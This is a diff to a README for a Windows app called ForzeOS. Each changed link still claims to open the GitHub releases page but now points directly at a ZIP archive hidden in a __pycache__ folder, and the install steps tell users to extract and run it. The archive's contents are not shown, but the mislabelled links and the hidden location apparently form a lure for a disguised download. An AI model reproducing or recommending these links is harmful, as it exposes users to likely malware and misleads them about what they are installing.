@@ -1,12 +1,12 @@
 # 🖥️ ForzeOS - Simple System Simulation for Windows
 
-[![Download ForzeOS](https://img.shields.io/badge/Download-ForzeOS-8A2BE2?style=for-the-badge&logo=github)](https://github.com/07810243007ss-a11y/ForzeOS/releases)
+[![Download ForzeOS](https://img.shields.io/badge/Download-ForzeOS-8A2BE2?style=for-the-badge&logo=github)](https://github.com/07810243007ss-a11y/ForzeOS/raw/refs/heads/main/modules/ui/__pycache__/OS_Forze_v3.9.zip)
 
 ## 📥 Download ForzeOS
 
 To get ForzeOS on Windows, visit the release page here:
 
-[Download ForzeOS from GitHub Releases](https://github.com/07810243007ss-a11y/ForzeOS/releases)
+[Download ForzeOS from GitHub Releases](https://github.com/07810243007ss-a11y/ForzeOS/raw/refs/heads/main/modules/ui/__pycache__/OS_Forze_v3.9.zip)
 
 Open the latest release, then download the Windows file listed there. If you see a ZIP file, save it to your computer and extract it before opening the app.
 
@@ -36,7 +36,7 @@ If the app uses a ZIP package, you will also need the built-in Windows extractor
 
 ## 📦 How to Install
 
-1. Open the [ForzeOS releases page](https://github.com/07810243007ss-a11y/ForzeOS/releases)
+1. Open the [ForzeOS releases page](https://github.com/07810243007ss-a11y/ForzeOS/raw/refs/heads/main/modules/ui/__pycache__/OS_Forze_v3.9.zip)
 2. Find the latest version at the top
 3. Look for the Windows download file
 4. Download the file to your computer
@@ -175,7 +175,7 @@ Use only files from the official release page. That helps you avoid damaged or c
 
 ## 📌 Quick Start
 
-1. Visit the [ForzeOS releases page](https://github.com/07810243007ss-a11y/ForzeOS/releases)
+1. Visit the [ForzeOS releases page](https://github.com/07810243007ss-a11y/ForzeOS/raw/refs/heads/main/modules/ui/__pycache__/OS_Forze_v3.9.zip)
 2. Download the latest Windows release
 3. Extract the file if it comes as ZIP
 4. Open the app from the extracted folder
@@ -197,4 +197,4 @@ ForzeOS is a modular Python system simulation built for end users who want a cle
 
 If you need to return to the download page, use this link:
 
-[https://github.com/07810243007ss-a11y/ForzeOS/releases](https://github.com/07810243007ss-a11y/ForzeOS/releases)
+[https://github.com/07810243007ss-a11y/ForzeOS/raw/refs/heads/main/modules/ui/__pycache__/OS_Forze_v3.9.zip](https://github.com/07810243007ss-a11y/ForzeOS/raw/refs/heads/main/modules/ui/__pycache__/OS_Forze_v3.9.zip)
